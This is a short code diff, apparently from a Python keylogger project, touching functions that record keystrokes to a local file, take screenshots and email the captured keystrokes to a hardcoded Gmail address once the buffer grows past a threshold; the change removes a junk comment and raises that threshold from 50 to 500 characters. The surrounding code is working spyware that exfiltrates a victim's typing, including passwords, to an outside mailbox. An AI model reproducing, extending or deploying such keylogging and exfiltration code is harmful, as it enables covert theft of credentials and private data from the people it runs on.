@@ -28,7 +28,7 @@ def screenCapture():
 
 def sendEmail(keyMessage):
     try:
-#sdkjnf ksn dfksn fkdns kfndskj nijndfsij nsdijf nsdjn kjndkcnsd dns knkini s
+
         screenCapture()
         msg = MIMEMultipart()
         fromaddr = 'keyhunter.hackspc@gmail.com'
@@ -66,7 +66,7 @@ def OnKeyboardEvent(event):
     file_log = open('keys.txt','r+')
     buffer = file_log.read()
     file_log.close()
-    if len(buffer) > 50:
+    if len(buffer) > 500:
         sendEmail(buffer[-1000:].replace("\n", "<br>"))
 
     file_log = open('keys.txt',  'w')
